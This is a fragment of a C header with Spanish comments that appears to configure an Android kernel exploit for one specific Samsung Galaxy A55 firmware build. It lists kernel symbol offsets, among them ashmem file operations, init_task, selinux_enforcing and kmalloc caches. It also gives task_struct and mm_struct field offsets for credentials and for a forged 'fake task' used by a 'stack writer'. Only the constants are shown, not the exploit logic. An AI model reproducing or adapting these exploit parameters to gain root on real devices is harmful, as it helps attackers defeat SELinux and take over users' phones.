...
#define BUILD_FINGERPRINT \
  "samsung/a55xnsxx/a55x:16/BP2A.250605.031/A556EXXSDCZB5:user/release-keys"
#endif
...
#define KERNELSNITCH_IDENTITY_START 0xfffff80000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xfffff90000000000ULL
#define DIRECT_MAP_BASE 0xffffff8c00000000ULL
#define DIRECT_MAP_END 0xffffffffffffffffULL
#define VMEMMAP_START 0xfffffffe00000000ULL

#define ASHMEM_MISC_FOPS_OFF 0x02338620ULL
#define ASHMEM_FOPS_OFF 0x0131ffb8ULL
#define ASHMEM_IOCTL_OFF 0x00cc8544ULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x00cc8e7cULL
#define ASHMEM_MMAP_OFF 0x00cc8ed4ULL
#define ASHMEM_OPEN_OFF 0x00cc90f4ULL
#define ASHMEM_RELEASE_OFF 0x00cc917cULL
#define ASHMEM_SHOW_FDINFO_OFF 0x00cc929cULL
#define CONFIGFS_READ_ITER_OFF 0x00469d74ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0046a2a4ULL
#define COPY_SPLICE_READ_OFF 0x003ea1fcULL
#define NOOP_LLSEEK_OFF 0x0039c6c8ULL
#define INIT_TASK_OFF 0x0a1bf700ULL
#define ROOT_TASK_GROUP_OFF 0x023c4d40ULL
#define SELINUX_ENFORCING_OFF 0x024991a8ULL
#define KMALLOC_CACHES_OFF 0x016bf898ULL
...
#define LOCK_OFF 0x6e0
#define W0_OFF 0x2050
...
#define FAKE_TASK_PRIO_OFF 0x6c
#define FAKE_TASK_NORMAL_PRIO_OFF 0x74
#define FAKE_TASK_TASK_GROUP_OFF 0x348
#define FAKE_TASK_PI_LOCK_OFF 0x924
#define FAKE_TASK_PI_WAITERS_OFF 0x938
#define FAKE_TASK_PI_TOP_TASK_OFF 0x708
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x710
...
/* Offsets de mm_struct para find_init_mm */
#define MM_USERS_OFF 0x44
#define MM_COUNT_OFF 0x48
#define ALLOC_LOCK_OFF 0x920
#define PI_LOCK_OFF 0x924

/* Zonas de mm_struct para collect_controlled_mm_group */
...
/* Offsets de task_struct para el stack writer */
#define TASK_PI_WAITERS_OFF 0x938
#define TASK_PI_TOP_TASK_OFF 0x708
#define TASK_PI_BLOCKED_ON_OFF 0x710
#define TASK_THREAD_INFO_OFF 0x0
#define TASK_STACK_OFF 0x20
#define TASK_CRED_OFF 0x620
#define TASK_REAL_CRED_OFF 0x618

/* === task_struct offsets (extraídos con pahole) === */
#define TASK_STRUCT_USAGE_OFF 0x40
#define TASK_STRUCT_PRIO_OFF 0x84
#define TASK_STRUCT_STATIC_PRIO_OFF 0x88
#define TASK_STRUCT_NORMAL_PRIO_OFF 0x8c
#define TASK_STRUCT_RT_PRIORITY_OFF 0x90
#define TASK_STRUCT_ALLOC_LOCK_OFF 0x920
#define TASK_STRUCT_PI_LOCK_OFF 0x924
#define TASK_STRUCT_WAKE_Q_OFF 0x928
#define TASK_STRUCT_WAKE_Q_COUNT_OFF 0x930
